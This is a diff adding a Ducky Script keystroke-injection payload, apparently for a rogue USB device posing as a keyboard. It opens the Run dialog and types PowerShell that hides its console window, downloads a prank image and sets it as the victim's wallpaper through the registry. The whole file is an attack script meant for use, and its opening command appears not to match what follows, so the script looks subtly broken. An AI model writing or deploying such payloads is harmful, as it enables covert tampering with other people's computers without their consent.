@@ -1,0 +1,74 @@
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+STRING Add-Type -Name Window -Namespace Console -MemberDefinition '
+ENTER
+DELAY 100
+STRING [DllImport("Kernel32.dll")]
+ENTER
+DELAY 100
+STRING public static extern IntPtr GetConsoleWindow();
+ENTER
+DELAY 100
+STRING [DllImport("user32.dll")]
+ENTER
+DELAY 100
+STRING public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '
+ENTER
+DELAY 100
+STRING $consoleHWND = [Console.Window]::GetConsoleWindow();
+ENTER
+DELAY 100
+STRING $consoleHWND = [Console.Window]::MoveWindow($consoleHWND, 0, 0, 0, 0);
+ENTER
+DELAY 100
+STRING $pshost = get-host
+ENTER
+DELAY 100
+STRING $pswindow = $pshost.ui.rawui
+ENTER
+DELAY 100
+STRING $newsize = $pswindow.buffersize
+ENTER
+DELAY 100
+STRING $newsize.height = 2000
+ENTER
+DELAY 100
+STRING $newsize.width = 200
+ENTER
+DELAY 100
+STRING $pswindow.buffersize = $newsize
+ENTER
+DELAY 100
+STRING $newsize = $pswindow.windowsize
+ENTER
+DELAY 100
+STRING $newsize.height = 1
+ENTER
+DELAY 100
+STRING $newsize.width = 1
+ENTER
+DELAY 100
+STRING $pswindow.windowsize = $newsize
+ENTER
+DELAY 100
+STRING $save_dir = "$HOME\Desktop\"
+ENTER
+DELAY 100
+STRING $img_url = "https://i.ytimg.com/vi/3tleO8QtVTE/maxresdefault.jpg"
+ENTER
+DELAY 100
+STRING $f = "rr.jpg"
+ENTER
+DELAY 100
+STRING wget $img_url -O "$save_dir$f"
+ENTER
+DELAY 100
+STRING reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "$save_dir$f" /f
+ENTER
+DELAY 100
+STRING Start-Sleep -s 3
+ENTER
+DELAY 100
